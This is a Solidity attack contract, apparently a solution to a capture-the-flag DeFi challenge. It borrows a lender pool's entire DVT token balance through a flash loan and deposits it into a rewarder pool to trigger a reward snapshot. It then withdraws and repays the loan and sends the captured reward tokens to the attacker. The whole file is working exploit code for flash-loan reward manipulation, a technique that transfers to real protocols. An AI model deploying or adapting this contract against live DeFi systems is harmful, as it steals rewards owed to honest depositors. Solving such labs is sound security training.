// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IFlashLoanerPool {
    function liquidityToken() external returns (IERC20);
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function rewardToken() external returns (IERC20);
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}


contract TheRewarderAttack {
    
    ITheRewarderPool private immutable rewarderPool;
    address private immutable attacker;
    
    // 1. store rewarder pool and attacker address (owner) for later use
    constructor(address theRewarderPool) {
        rewarderPool = ITheRewarderPool(theRewarderPool);
        attacker = msg.sender;
    }

    // 2. take out a flash loan of as many DVT tokens as available
    function attack(address flashLoanerPool) external {
        IFlashLoanerPool pool = IFlashLoanerPool(flashLoanerPool);
        uint256 poolBalance = pool.liquidityToken().balanceOf(flashLoanerPool);
        pool.flashLoan(poolBalance);
    }

    // 3. work with the receicved flash loan
    function receiveFlashLoan(uint256 amount) external {
        // 4. deposit loaned tokens in rewarder pool --> triggers snapshot and reward distribution if block timestamp is right
        IERC20 liquidityToken = IFlashLoanerPool(msg.sender).liquidityToken();
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        // 5. withdraw the loaned tokens again and repay the loaner pool
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        // 6. forward the rewards to the attacker
        IERC20 rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
